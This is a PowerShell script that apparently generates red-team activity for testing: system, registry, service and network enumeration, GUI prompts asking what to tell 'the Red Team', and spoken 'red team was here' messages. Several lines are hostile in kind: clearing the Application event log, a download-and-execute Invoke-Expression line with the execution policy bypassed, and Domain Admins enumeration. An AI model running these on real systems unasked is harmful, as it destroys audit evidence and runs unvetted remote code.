Get-Process | Get-Member | Out-Host -Paging
Get-Process | Get-Member -MemberType Properties
import-module activedirectory
Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace
Get-CimInstance -Class Win32_LogicalDisk |
  Select-Object -Property Name, @{
    label='FreeSpace'
    expression={($_.FreeSpace/1GB).ToString('F2')}
  }
  1,2,3,4,5,6,7 | Where-Object {$_ -lt 4}
Get-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq 'Running'}
Get-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Where-Object {$_.StartMode -eq "Auto"}
Get-CimInstance -Class Win32_SystemDriver | Where-Object {$_.State -eq "Running"} | Where-Object {$_.StartMode -eq "Manual"} | Format-Table -Property Name,DisplayName
Get-CimInstance -Class Win32_SystemDriver | Where-Object {($_.State -eq 'Running') -and ($_.StartMode -eq 'Manual')} | Format-Table -Property Name,DisplayName
Get-ChildItem |
  Sort-Object -Property LastWriteTime, Name |
  Format-Table -Property LastWriteTime, Name
Get-ChildItem |
  Sort-Object -Property LastWriteTime, Name -Descending |
  Format-Table -Property LastWriteTime, Name
Get-ChildItem |
  Sort-Object -Property @{ Expression = 'LastWriteTime'; Descending = $true },
                        @{ Expression = 'Name'; Ascending = $true } |
  Format-Table -Property LastWriteTime, Name
Get-ChildItem |
  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |
  Format-Table -Property LastWriteTime, CreationTime
New-Object -TypeName System.Diagnostics.EventLog
New-Object -TypeName System.Diagnostics.EventLog -ArgumentList Application
$AppLog = New-Object -TypeName System.Diagnostics.EventLog -ArgumentList Application  
$RemoteAppLog = New-Object -TypeName System.Diagnostics.EventLog Application,127.0.0.1
$RemoteAppLog
$RemoteAppLog | Get-Member -MemberType Method
$RemoteAppLog.Clear()
$AppLog.Clear()
$a = 1,2,"three"
Get-Member -InputObject $a
$WshShell = New-Object -ComObject WScript.Shell
$WshShell | Get-Member
[System.Console]::beep(440, 500)
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $true
$ie.Navigate("https://urldefense.com/v3/__https://devblogs.microsoft.com/scripting/__;!!KLCbKzk!iSueaBqZc78sqRK0RAOIcm_h0_-a5EuBuxa99kPqQB8wOtPMTM5OPYO0AYUAsSCVPbdHdQt8OuP1fbk$  ")
$ie.Document.Body.InnerText
$ie.Quit()
$ie | Get-Member
Remove-Variable ie
$xl = New-Object -ComObject Excel.Application -Strict
New-Object System.Environment
New-Object System.Math
[System.Environment]
[System.Environment] | Get-Member
[System.Environment]::Commandline
[System.Environment]::OSVersion
[System.Environment]::HasShutdownStarted
[System.Math] | Get-Member -Static -MemberType Methods
[System.Math]::Sqrt(9)
[System.Math]::Pow(2,3)
[System.Math]::Floor(3.3)
[System.Math]::Floor(-3.3)
[System.Math]::Ceiling(3.3)
[System.Math]::Ceiling(-3.3)
[System.Math]::Max(2,7)
[System.Math]::Min(2,7)
[System.Math]::Truncate(9.3)
[System.Math]::Truncate(-9.3)
Get-CimClass -Namespace root/CIMV2 |
  Where-Object CimClassName -like Win32* |
    Select-Object CimClassName
Get-CimClass -Namespace root/CIMV2 -ComputerName 10.10.10.10 
Get-CimInstance -Class Win32_OperatingSystem
Get-CimInstance Win32_OperatingSystem
Get-CimInstance -Class Win32_OperatingSystem |
  Format-Table -Property TotalVirtualMemorySize, TotalVisibleMemorySize,
    FreePhysicalMemory, FreeVirtualMemory, FreeSpaceInPagingFiles
Get-CimInstance -Class Win32_OperatingSystem | Format-List Total*Memory*, Free*
Get-Command -Noun Item
Get-ChildItem HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
New-Item -Path c:\temp -ItemType Directory
New-Item -Path c:\temp\Test.Directory -ItemType Directory
New-Item -Path C:\temp\Test.Directory\testfile1.txt -ItemType file
Rename-Item -Path C:\temp\Test.Directory\testfile1.txt testfile2.txt
Get-ChildItem -Path C:\temp\New.Directory
Move-Item -Path C:\temp\Test.Directory -Destination C:\temp\ -PassThru
Remove-Item C:\temp\Test.Directory -Recurse
Invoke-Item C:\WINDOWS
Invoke-Item C:\boot.ini
Get-Command | Out-Host -Paging
Get-Process | Out-Host -Paging | Format-List
Get-Process | Format-List | Out-Host -Paging
Get-Command | Out-Null
Get-Process | Out-File -FilePath C:\temp\processlisttest.txt
Remove-Item C:\temp\processlisttest.txt
Get-Process | Out-File -FilePath C:\temp\processlisttest.txt -Encoding ASCII
Remove-Item C:\temp\processlisttest.txt
Get-Command | Out-File -FilePath C:\temp\processlisttest.txt
Remove-Item C:\temp\processlisttest.txt
Get-Command -Verb Format -Module Microsoft.PowerShell.Utility
Get-Process -Name iexplore
Get-Command -Verb Format | Format-Wide
Get-Command -Verb Format | Format-Wide -Property Noun
Get-Command -Verb Format | Format-Wide -Property Noun -Column 3
Get-Process -Name iexplore | Format-List
Get-Process -Name iexplore | Format-List -Property ProcessName,FileVersion,StartTime,Id
Get-Process -Name iexplore | Format-List -Property *
Get-Service -Name win* | Format-Table
Get-Service -Name win* | Format-Table -AutoSize
Get-Service -Name win* | Format-Table -Property Name,Status,StartType,DisplayName,DependentServices -AutoSize
Get-Service -Name win* | Format-Table -Property Name,Status,StartType,DisplayName,DependentServices -Wrap
Get-Process -Name iexplore | Format-Table -Wrap -AutoSize -Property FileVersion,Path,Name,Id
Get-Service -Name win* | Sort-Object StartType | Format-Table -GroupBy StartType
Get-CimInstance -ClassName Win32_Desktop
Get-CimInstance -ClassName Win32_Desktop | Select-Object -ExcludeProperty "CIM*"
Get-CimInstance -ClassName Win32_BIOS
Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProperty "CIM*"
Get-CimInstance -ClassName Win32_ComputerSystem
Get-CimInstance -ClassName Win32_QuickFixEngineering
Get-CimInstance -ClassName Win32_QuickFixEngineering -Property HotFixID
Get-CimInstance -ClassName Win32_QuickFixEngineering -Property HotFixId |
    Select-Object -Property HotFixId
	write-output "Checkpoint 50"
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Build*,OSType,ServicePack*
Get-CimInstance -ClassName Win32_OperatingSystem |
  Select-Object -Property NumberOfLicensedUsers,NumberOfUsers,RegisteredUser
Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property *user*
Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3"
Get-CimInstance -ClassName Win32_LogicalDisk -Filter "DriveType=3" |
  Measure-Object -Property FreeSpace,Size -Sum |
    Select-Object -Property Property,Sum
Get-CimInstance -ClassName Win32_LogonSession
Get-CimInstance -ClassName Win32_ComputerSystem -Property UserName
Get-CimInstance -ClassName Win32_LocalTime
Get-CimInstance -ClassName Win32_Service |
    Select-Object -Property Status,Name,DisplayName
Get-CimInstance -ClassName Win32_Service |
    Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap
	write-output "Gonna have a wait here for a few minutes while things think"
Get-EventLog -LogName Application | Where-Object Source -Match defrag
Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'defrag' }
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='*defrag'
}
Get-WinEvent -FilterHashtable @{LogName='Application'; 'Service'='Bits'}
Get-WinEvent -FilterHashtable @{
   LogName='Application'
}
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
}
[System.Diagnostics.Eventing.Reader.StandardEventKeywords] | Get-Member -Static -MemberType Property
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
   Keywords=36028797018963968
}
$tempvariable = [System.Diagnostics.Eventing.Reader.StandardEventKeywords]::EventLogClassic
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
   Keywords=$C.Value__
}
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
   Keywords=36028797018963968
   ID=1023
}
[System.Diagnostics.Eventing.Reader.StandardEventLevel] | Get-Member -Static -MemberType Property
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
   Keywords=36028797018963968
   ID=1023
   Level=2
}
$C = [System.Diagnostics.Eventing.Reader.StandardEventLevel]::Informational
Get-WinEvent -FilterHashtable @{
   LogName='Application'
   ProviderName='.NET Runtime'
   Keywords=36028797018963968
   ID=1023
   Level=$C.Value__
}
write-output "checkpoint 52"
Get-Location
cd -Path C:\Windows
chdir -Path .. -PassThru
Set-Location D:
Get-ChildItem -Path C:\ -Force
Get-Content -Path C:\boot.ini
(Get-Content -Path C:\boot.ini).Length
Get-ChildItem -Path C:\Windows\?????.log
Get-ChildItem -Path C:\Windows\x*
Get-ChildItem -Path C:\Windows\[xz]*
Get-ChildItem -Path C:\WINDOWS\System32\w*32*.dll -Exclude win*
Get-ChildItem -Path C:\Windows\*.dll -Recurse -Exclude [a-y]*.dll
Get-ChildItem -Path C:\Windows -Include *.dll -Recurse -Exclude [a-y]*.dll
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion |
  Select-Object -ExpandProperty Property
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion
Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion -Name DevicePath
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /v DevicePath
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Name RedTesting -PropertyType String -Value $PSHome
Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion -Name RedTesting
Get-ChildItem -Path HKCU:\ | Select-Object Name
Get-ChildItem -Path Registry::HKEY_CURRENT_USER
Get-ChildItem -Path Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER
Get-ChildItem -Path Registry::HKCU
Get-ChildItem -Path Microsoft.PowerShell.Core\Registry::HKCU
Get-ChildItem HKCU:
Get-ChildItem -Path HKCU:\Software -Recurse |
  Where-Object {($_.SubKeyCount -le 1) -and ($_.ValueCount -eq 4) }
New-Item -Path HKCU:\Software_DeleteMe
Remove-Item -Path HKCU:\Software_DeleteMe
New-Item -Path Registry::HKCU\Software_DeleteMe
Remove-Item -Path HKCU:\Software_DeleteMe
Get-Process -id 0
# comment is here
Get-Process -Id 99
Get-Process -Name ex*
Get-Process -Name exp*,power*
Get-Process -Name PowerShell -ComputerName localhost, Server01, Server02
Get-Process -Name PowerShell -ComputerName localhost, Server01, Server01 |
    Format-Table -Property ID, ProcessName, MachineName
Get-Process powershell -ComputerName localhost, Server01, Server02 |
    Format-Table -Property Handles,
        @{Label="NPM(K)";Expression={[int]($_.NPM/1024)}},
        @{Label="PM(K)";Expression={[int]($_.PM/1024)}},
        @{Label="WS(K)";Expression={[int]($_.WS/1024)}},
        @{Label="VM(M)";Expression={[int]($_.VM/1MB)}},
        @{Label="CPU(s)";Expression={if ($_.CPU -ne $()){$_.CPU.ToString("N")}}},
        Id, ProcessName, MachineName -auto
Stop-Process -Name Idle
Invoke-Command -BogusComputerName Server01 {Stop-Process Powershell}
Get-Service -Name se*
Get-Service -DisplayName se*
Get-Service -ComputerName BogusServer01
Get-Service -Name LanmanWorkstation -RequiredServices
Get-Service -Name LanmanWorkstation -DependentServices
Get-Service -Name * | Where-Object {$_.RequiredServices -or $_.DependentServices} |
  Format-Table -Property Status, Name, RequiredServices, DependentServices -auto
Stop-Service -Name spooler
Start-Service -Name spooler
Restart-Service -Name spooler
Invoke-Command -BogusComputerName Server01 {Restart-Service Spooler}
write-output "Hope you were not trying to print anything"
Get-PSDrive
Get-Command -Name Get-PSDrive -Syntax
Get-PSDrive -PSProvider FileSystem
Get-PSDrive -PSProvider Registry
Get-CimInstance -Class Win32_Printer
(New-Object -ComObject WScript.Network).EnumPrinterConnections()
(New-Object -ComObject WScript.Network).RemovePrinterConnection("\\BogusPrintserver01\Xerox5")
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true |
    Select-Object -ExpandProperty IPAddress
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true |
    Get-Member -Name IPAddress
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=$true |
    Select-Object -ExcludeProperty IPX*,WINS*
Get-CimInstance -Class Win32_PingStatus -Filter "Address='127.0.0.1'"
Get-CimInstance -Class Win32_PingStatus -Filter "Address='127.0.0.1'" |
  Format-Table -Property Address,ResponseTime,StatusCode -Autosize
'127.0.0.1','localhost','bing.com' |
  ForEach-Object -Process {
    Get-CimInstance -Class Win32_PingStatus -Filter ("Address='$_'") |
      Select-Object -Property Address,ResponseTime,StatusCode
  }
1..4| ForEach-Object -Process {
  Get-CimInstance -Class Win32_PingStatus -Filter ("Address='192.168.1.$_'") } |
    Select-Object -Property Address,ResponseTime,StatusCode
Get-CimInstance -Class Win32_NetworkAdapter -ComputerName .
write-output "Checkpoint 111"
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$true"
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=$true and DHCPEnabled=$true"
Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter  "IPEnabled=$true and DHCPEnabled=$true" |
  Format-Table -Property DHCP*
(Get-CimClass -ClassName Win32_Share).CimClassMethods
(Get-CimClass -ClassName Win32_Share).CimClassMethods['Create'].Parameters
Invoke-CimMethod -ClassName Win32_Share -MethodName Create -Arguments @{
    Path = 'C:\temp'
    Name = 'RedTempShare'
    Type = [uint32]0 #Disk Drive
    MaximumAllowed = [uint32]25
    Description = 'test share of the temp folder'
}
$wql = 'SELECT * from Win32_Share WHERE Name="RedTempShare"'
Invoke-CimMethod -MethodName Delete -Query $wql
New-PSDrive -Name "X" -PSProvider "FileSystem" -Root "\\BogusServer01\Public"
New-PSDrive -Persist -Name "X" -PSProvider "FileSystem" -Root "\\BogusServer01\Public"
Get-CimInstance -Class Win32_Product |
  Where-Object Name -eq "Microsoft .NET Core Runtime - 2.1.5 (x64)"
Get-CimInstance -Class Win32_Product |
  Where-Object Name -eq "Microsoft .NET Core Runtime - 2.1.5 (x64)" |
    Format-List -Property *
Get-CimInstance -Class Win32_Product -Filter "Name='Microsoft .NET Core Runtime - 2.1.5 (x64)'" |
  Format-List -Property *
Get-CimInstance -Class Win32_Product  -Filter "Name='Microsoft .NET Core Runtime - 2.1.5 (x64)'" |
  Format-List -Property Name,InstallDate,InstallLocation,PackageCache,Vendor,Version,IdentifyingNumber
New-PSDrive -Name Uninstall -PSProvider Registry -Root HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
(Get-ChildItem -Path Uninstall:).Count
$UninstallableApplications = Get-ChildItem -Path Uninstall:
$UninstallableApplications | ForEach-Object -Process { $_.GetValue('DisplayName') }
powershell.exe -Command {
    $i = 1
    while ( $i -le 1 )
    {
        Write-Output -InputObject $i
        Start-Sleep -Seconds 1
        $i++
    }
}
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
write-output "Need you to click on a few windows to proceed"
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Totally Legit Program'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(75,120)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = 'OK'
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(150,120)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = 'Nevermind'
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = 'What do you want the Red Team to know?'
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(10,40)
$textBox.Size = New-Object System.Drawing.Size(260,20)
$form.Controls.Add($textBox)

$form.Topmost = $true

$form.Add_Shown({$textBox.Select()})
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $x = $textBox.Text
    $x
}
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object Windows.Forms.Form -Property @{
    StartPosition = [Windows.Forms.FormStartPosition]::CenterScreen
    Size          = New-Object Drawing.Size 243, 230
    Text          = 'Select a Date'
    Topmost       = $true
}

$calendar = New-Object Windows.Forms.MonthCalendar -Property @{
    ShowTodayCircle   = $false
    MaxSelectionCount = 1
}
$form.Controls.Add($calendar)

$okButton = New-Object Windows.Forms.Button -Property @{
    Location     = New-Object Drawing.Point 38, 165
    Size         = New-Object Drawing.Size 75, 23
    Text         = 'OK'
    DialogResult = [Windows.Forms.DialogResult]::OK
}
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object Windows.Forms.Button -Property @{
    Location     = New-Object Drawing.Point 113, 165
    Size         = New-Object Drawing.Size 75, 23
    Text         = 'Cancel'
    DialogResult = [Windows.Forms.DialogResult]::Cancel
}
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$result = $form.ShowDialog()

if ($result -eq [Windows.Forms.DialogResult]::OK) {
    $date = $calendar.SelectionStart
    Write-Host "Date selected: $($date.ToShortDateString())"
}
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
<#
     regular powershell scripts have comment blocks
	 
	 so here is one
	 yep
	 
	 go go go 
	 #>
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Data Entry Form'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'

$OKButton = New-Object System.Windows.Forms.Button
$OKButton.Location = New-Object System.Drawing.Point(75,120)
$OKButton.Size = New-Object System.Drawing.Size(75,23)
$OKButton.Text = 'OK'
$OKButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $OKButton
$form.Controls.Add($OKButton)

$CancelButton = New-Object System.Windows.Forms.Button
$CancelButton.Location = New-Object System.Drawing.Point(150,120)
$CancelButton.Size = New-Object System.Drawing.Size(75,23)
$CancelButton.Text = 'Nevermind'
$CancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $CancelButton
$form.Controls.Add($CancelButton)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = 'Please make a selection from the list below:'
$form.Controls.Add($label)

$listBox = New-Object System.Windows.Forms.Listbox
$listBox.Location = New-Object System.Drawing.Point(10,40)
$listBox.Size = New-Object System.Drawing.Size(260,20)

$listBox.SelectionMode = 'MultiExtended'

[void] $listBox.Items.Add('Pen Test Rulez')
[void] $listBox.Items.Add('Red Team Rulez')
[void] $listBox.Items.Add('Blues Smell of Elderberries')
[void] $listBox.Items.Add('Sean Rulez')
[void] $listBox.Items.Add('Running Out of Ideas')

$listBox.Height = 70
$form.Controls.Add($listBox)
$form.Topmost = $true

$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $x = $listBox.SelectedItems
    $x
}
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Select a Computer'
$form.Size = New-Object System.Drawing.Size(300,200)
$form.StartPosition = 'CenterScreen'

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(75,120)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = 'OK'
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(150,120)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = 'Nevermind'
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = 'Please select a totally legit computer:'
$form.Controls.Add($label)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(10,40)
$listBox.Size = New-Object System.Drawing.Size(260,20)
$listBox.Height = 80

[void] $listBox.Items.Add('bogus-001')
[void] $listBox.Items.Add('bogus-002')
[void] $listBox.Items.Add('bogus-003')
[void] $listBox.Items.Add('bogus-004')
[void] $listBox.Items.Add('bogus-005')
[void] $listBox.Items.Add('bogus-006')
[void] $listBox.Items.Add('bogus-007')

$form.Controls.Add($listBox)

$form.Topmost = $true

$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $x = $listBox.SelectedItem
    $x
}
try {
	Add-Type -AssemblyName System.Speech
	$Synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
	$Synth.GetInstalledVoices() | 
		Select-Object -ExpandProperty VoiceInfo | 
		Select-Object -Property Name, Culture, Gender, Age
} catch {
}
$obj = new-object -com wscript.shell
	$obj.SendKeys([char]173)
$testpercent = 100
$obj = New-Object -com wscript.shell
	for ([int]$i = 0; $i -lt $testpercent; $i += 2) {
		$obj.SendKeys([char]175) # each tick is +2%
	}
[System.Console]::beep(440, 500)      
[System.Console]::beep(440, 500)
[System.Console]::beep(440, 500)       
[System.Console]::beep(349, 350)       
[System.Console]::beep(523, 150)       
[System.Console]::beep(440, 500)       
[System.Console]::beep(349, 350)       
[System.Console]::beep(523, 150)       
[System.Console]::beep(440, 1000)
[System.Console]::beep(659, 500)       
[System.Console]::beep(659, 500)       
[System.Console]::beep(659, 500)       
[System.Console]::beep(698, 350)       
[System.Console]::beep(523, 150)       
[System.Console]::beep(415, 500)       
[System.Console]::beep(349, 350)       
[System.Console]::beep(523, 150)       
[System.Console]::beep(440, 1000)
$testtext = "red team was here"
	$Voice = new-object -ComObject SAPI.SPVoice
	$Voice.Speak($testtext)
$TTSVoice = New-Object -ComObject SAPI.SPVoice
foreach ($Voice in $TTSVoice.GetVoices()) {
	if ($Voice.GetDescription() -like "*- German*") { 
		$TTSVoice.Voice = $Voice
		$TTSVoice.Speak($testtext)
}}
$speak.voice
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speak.GetInstalledVoices()
$speak.SelectVoice('Microsoft Zira Desktop')
$speak.speak("red team was here")
try {
	if (test-path "/sys/class/thermal/thermal_zone0/temp" -pathType leaf) {
		[int]$IntTemp = get-content "/sys/class/thermal/thermal_zone0/temp"
		$Temp = [math]::round($IntTemp / 1000.0, 1)
	} else {
		$data = Get-WMIObject -Query "SELECT * FROM Win32_PerfFormattedData_Counters_ThermalZoneInformation" -Namespace "root/CIMV2"
		$Temp = @($data)[0].HighPrecisionTemperature
		$Temp = [math]::round($Temp / 100.0, 1)
	}
	if ($Temp -gt 80) {
		$Reply = "CPU is $($Temp)°C extremely hot!"
	} elseif ($Temp -gt 50) {
		$Reply = "CPU is $($Temp)°C hot."
	} elseif ($Temp -gt 0) {
		$Reply = "CPU is $($Temp)°C warm."
	} elseif ($Temp -gt -20) {
		$Reply = "CPU is $($Temp)°C cold."
	} else {
		$Reply = "CPU is $($Temp)°C extremely cold!"
	}
	& "$PSScriptRoot/give-reply.ps1" $Reply
} catch {
}
$testfile="c:\windows\system32\calc.exe"
$result = get-filehash $testfile -algorithm MD5
echo $result.hash
$Colors = [Enum]::GetValues([ConsoleColor])
	""
	"Color          As Foreground  As Background"
	"-----          -------------  -------------"
	foreach($Color in $Colors) {
		$Color = "$Color              "
		$Color = $Color.substring(0, 15)
		write-host -noNewline "$Color"
		write-host -noNewline -foregroundcolor $Color "$Color"
		write-host -noNewline -backgroundcolor $Color "$Color"
		write-host ""
	}
$testFilePath="c:\"
function ListScripts { param([string]$testFilePath)
	write-progress "Reading $testFilePath..."
	$Table = import-csv "$testFilePath"
	foreach($Row in $Table) {
		New-Object PSObject -Property @{
			'PowerShell Script' = "$($Row.Script)"
			'Description' = "$($Row.Description)"
		}
	}
	$global:NumScripts = $Table.Count
	write-progress -completed "Reading $testFilePath..."
}
	$PathToRepo = "c:\"
	ListScripts "$PathToRepo/windows/system32/drivers/etc/hosts" | format-table -property "PowerShell Script",Description

	"$($global:NumScripts) PowerShell scripts total"
	write-output "Not really, but you have that many lines in your hosts file."
function ListCountries { 
	$Countries = (Invoke-WebRequest -uri "https://urldefense.com/v3/__https://restcountries.eu/rest/v2/all__;!!KLCbKzk!iSueaBqZc78sqRK0RAOIcm_h0_-a5EuBuxa99kPqQB8wOtPMTM5OPYO0AYUAsSCVPbdHdQt8j_VpsPE$  " -userAgent "curl" -useBasicParsing).Content | ConvertFrom-Json
	foreach($Country in $Countries) {
		New-Object PSObject -Property @{
			'Country' = "$($Country.Name)"
			'Capital' = "$($Country.Capital)"
			'Population' = "$($Country.Population)"
			'TLD' = "$($Country.TopLevelDomain)"
			'Phone' = "+$($Country.CallingCodes)"
		}
	}
}
	ListCountries | format-table -property Country,Capital,Population,TLD,Phone
function GetPermutations {
    [cmdletbinding()]
    Param(
        [parameter(ValueFromPipeline=$True)]
        [string]$String = 'the'
    )
    Begin {
        Function NewAnagram { Param([int]$NewSize)              
            if ($NewSize -eq 1) {
                return
            }
            for ($i=0;$i -lt $NewSize; $i++) { 
                NewAnagram  -NewSize ($NewSize - 1)
                if ($NewSize -eq 2) {
                    New-Object PSObject -Property @{
                        Permutation = $stringBuilder.ToString()                  
                    }
                }
                MoveLeft -NewSize $NewSize
            }
        }
        Function MoveLeft { Param([int]$NewSize)        
            $z = 0
            $position = ($Size - $NewSize)
            [char]$temp = $stringBuilder[$position]           
            for ($z=($position+1);$z -lt $Size; $z++) {
                $stringBuilder[($z-1)] = $stringBuilder[$z]               
            }
            $stringBuilder[($z-1)] = $temp
        }
    }
    Process {
        $size = $String.length
        $stringBuilder = New-Object System.Text.StringBuilder -ArgumentList $String
        NewAnagram -NewSize $Size
    }
    End {}
}
		$Word = "redteam"
		$Columns = "4"
	GetPermutations -String $Word | Format-Wide -Column $Columns
Write-Output "Adding telemetry domains to bogus hosts file"
    $hosts_file = "c:\temp\hosts"
    $domains = @(
        "184-86-53-99.deploy.static.akamaitechnologies.com"
    )
    Write-Output "" | Out-File -Encoding ASCII -Append $hosts_file
    foreach ($domain in $domains) {
        if (-Not (Select-String -Path $hosts_file -Pattern $domain)) {
            Write-Output "0.0.0.0 $domain" | Out-File -Append $hosts_file
        }
    }
if ($chocoinstalled -eq $null) {
        Write-Output "Seems like Chocolatey is not installed, installing now"
        Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://urldefense.com/v3/__https://chocolatey.org/installz.ps1__;!!KLCbKzk!iSueaBqZc78sqRK0RAOIcm_h0_-a5EuBuxa99kPqQB8wOtPMTM5OPYO0AYUAsSCVPbdHdQt8Q8Nl6ao$  '))
        choco feature enable -n allowGlobalConfirmation
    } else {
        choco feature enable -n allowGlobalConfirmation
        Write-Output "Chocolatey is already installed"
    }
$cred = "bogus"
Get-ADGroupMember -Credential $cred -server test.com "Domain Admins"
Get-ADComputer -Credential $cred -server test.com -LDAPFilter "(name=*testuser*)" |select name
$alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
$inputname = "Sean"
$inputname = (($inputname.ToUpper()).Replace(" " , "")).ToCharArray() | Select-Object -Unique
foreach ($letter in $inputname){
    $index = $alphabet.IndexOf("$letter") + 1
    $IDNumber = ("$IDNumber" + "$index")
}
$IDnumber = $IDNumber.ToCharArray() | Select-Object -First 9
$FinalNumber = [System.String]::Join("",$IDNumber)
$FinalNumber
function Do-Thing {
    Param([string]$inputname)
    $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    $inputname = (($inputname.ToUpper()).Replace(" " , "")).ToCharArray() | Select-Object -Unique
    foreach ($letter in $inputname) {
        $index = $alphabet.IndexOf("$letter") + 1
        $IDNumber = ("$IDNumber" + "$index")
    }
    $IDnumber = $IDNumber.ToCharArray() | Select-Object -First 9
    $FinalNumber = [System.String]::Join("", $IDNumber)
    $FinalNumber
}
Do-Thing -inputname "My String Input Here"
$Sentence=“It was the best of times, it was the worst of times, because my Cat ate my lunch!”

foreach ($x in 1..$Sentence.Length) {

Write-host $Sentence[$x-1] –nonewline

Start-sleep –milliseconds (GET-RANDOM 100)

}
WRITE-HOST
function flipcoin {
    param($odds=25,$base=50)

    IF ((GET-RANDOM $BASE) -gt $odds) { return $TRUE }
}
clear-host
write-host
$Rows = 15
$Slash = 1
    $oldpos = $host.ui.RawUI.CursorPosition
    Foreach ($r in ($Slash ..2 +3 +4 +5 +6 +7 +8 +9 +10 +11 +12 +13 +14)){
        write-host $("   " * $r) -NoNewline
        1..((($rows +$r) * 0)+1) | %{
                write-Host " ***" -ForegroundColor White  -nonewline
       }
        write-host ""
    }        
    Foreach ($r in ($rows..2)){
        write-host $("   " * $r) -NoNewline
        1..((($rows -$r) * 0)+3) | %{ 
                write-Host "*" -ForegroundColor White  -nonewline
       }
        write-host ""
    }          
